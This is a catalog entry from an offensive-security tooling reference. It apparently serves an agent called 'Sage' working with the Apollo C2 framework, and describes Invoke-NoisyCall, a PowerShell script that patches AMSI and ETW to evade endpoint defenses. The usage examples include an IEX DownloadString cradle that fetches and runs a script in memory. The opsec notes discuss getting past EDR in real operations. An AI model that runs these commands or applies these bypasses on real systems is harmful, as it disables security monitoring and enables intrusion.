---
name: Invoke-NoisyCall
category: defense-evasion
subcategories: [indirect-syscall, amsi-bypass, etw-patching]
tradecraft_tags: [indirect-syscalls, amsi, etw, defense-evasion, powershell, bypass]
mitre_attack:
  - id: T1562.001
    name: Impair Defenses — Disable or Modify Tools
source:
  url: https://github.com/FuzzySecurity/Sharp-Suite
  license: Unknown
  maintained: false
binary_type: powershell-script
binary_filename: Invoke-NoisyCall.ps1
supported_os: [windows]
architecture: [x64]
privilege_required: user
network_required: false
detection_signal: |
  Indirect syscall patterns in PowerShell context are detectable by kernel-level
  EDR hooks that monitor syscall invocation from unexpected call stacks (JIT-compiled
  PowerShell code issuing direct syscalls). ETW patching generates specific memory
  write events if memory-write telemetry is active.
usage_examples:
  - description: Patch AMSI and ETW in current PowerShell session
    args: "Invoke-NoisyCall"
  - description: Apply bypass before loading other PS tools
    args: "IEX (New-Object Net.WebClient).DownloadString('Invoke-NoisyCall.ps1'); Invoke-NoisyCall"
opsec_notes: |
  AMSI/ETW bypasses in PowerShell are an arms race. This specific implementation may
  be detected by current EDR versions. Always test in a lab against the target EDR
  before relying on it for real operations. Modern EDR (CrowdStrike Falcon, SentinelOne)
  use kernel-level protection that cannot be patched from user-mode PowerShell.
gotchas: |
  Not actively maintained — the techniques it implements (indirect syscalls, ETW patching)
  are well-known and many EDRs detect the exact memory patterns. For Apollo operations,
  AMSI bypass at the .NET level (Apollo's inline_assembly AMSI bypass) is more reliable
  than PowerShell-level patches. This tool is documented as a technique reference.
related_ttps: [seatbelt, powerview, inceptor]
alternatives: [amsi-provider-bypass, donut-amsi, reflection-amsi]
common_args: {}
last_updated: 2026-05-29
---

# Invoke-NoisyCall

FuzzySecurity's PowerShell-based AMSI bypass and ETW patching script that uses
indirect syscall techniques. Patches the current PowerShell session's AMSI provider
and ETW event trace to allow subsequent malicious scripts to run without triggering
AMSI scanning. Named "NoisyCall" for its indirect syscall approach.

## Typical use cases
- Bypass AMSI before loading PowerShell-based tools (PowerView, DomainPasswordSpray)
- Patch ETW to reduce visibility of PowerShell operations

## How Sage uses this
Technique reference for AMSI bypass in PowerShell contexts. For Apollo specifically,
the `powershell_import` command may include built-in AMSI bypass — check Apollo's
implementation before adding an extra bypass layer.

## Notes
This technique is in an active arms race with EDR vendors. Test against target EDR
before use. Apollo's inline_assembly bypasses AMSI at the .NET/AppDomain level,
which may be more reliable than PowerShell-level patches for .NET assembly execution.
